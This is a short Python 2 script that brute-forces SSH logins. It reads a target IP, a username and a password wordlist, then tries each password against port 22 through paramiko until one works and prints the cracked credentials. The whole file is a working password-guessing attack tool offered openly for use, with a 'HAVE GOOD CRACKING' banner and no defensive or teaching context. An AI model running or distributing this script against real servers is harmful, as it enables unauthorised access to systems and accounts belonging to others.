#!/usr/bin/python
#
# Author ScianKabestia
# Version 1.1
# Python 2
# Simple ssh brute
# Requirements termcolor, paramiko 
# "pip install termcolor"; pip install paramiko
# 

import paramiko
import time
import sys
import os
import socket
from termcolor import *
from threading import *
import multiprocessing

global host, username, input_file #global variables

line = "\n-------------------------------------------------------------------------\n"

print (colored("<<< [+] SSH BRUTE >>>",'yellow'))
print "Author: ScianKaBestia\n"

try:
	host= raw_input (colored("[+] Enter Target IP: " ,'blue'))# just banner
	username= raw_input(colored("[+] Enter SSH Username: ",'blue'))#just banner
	input_file= raw_input(colored("[+] Enter Path Password list: ", 'blue'))# just banner
	print ("[+] HAVE GOOD CRACKING ;)")#just banner

	if os.path.exists(input_file)== False:
		print (colored("\n[-] File Path Doesn't Exist!",'red'))
		sys.exit(4)

except KeyboardInterrupt:# if user press Ctrl+c 
	print (colored("\n\n[*] Process Stopped", 'red'))
	sys.exit(3)

def ssh_connect(password, code=0): #[+] Connection Established
	ssh=paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:                      # Port
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code=1  #[!] Authentication Failled
	except socket.error, e:
		code=2 #[!] Host down or Connection refused through a Firewall

	ssh.close()
	return code

input_file = open(input_file)
print ""

for i in input_file.readlines():
	password=i.strip("\n")
	try:
		response=ssh_connect(password)

		if response==0: #[+]Connection Established
			print(colored("%s[+]User: %s [+]Password Found: %s [+]Target: %s%s" %(line ,username, password, host, line),'green'))
			print(colored("SSH Login - [ssh user@IP]",'grey'))#Print values,
			sys.exit(0)
		elif response==1: #[!]Authentication Failed
			print(colored("[?] User: %s [?] Tryng Password: %s  Login Incorrect!" %(username,password),'yellow'))
		elif response==2: #[!]Connection Refused
			print(colored("[?] Unbale to Connect to Target: %s ,maybe Host is Down or there is a Firewall in place" %(host),'yellow'))
			sys.exit(2)
			
	except KeyboardInterrupt:# If user press Ctrl+c
		print (colored("\n\n[*] Process Stopped By User",'red'))
		print(colored("[+] See You ;)"))
		sys.exit(3)
	except Exception, e:
	    print e
	    pass

input_file.close()
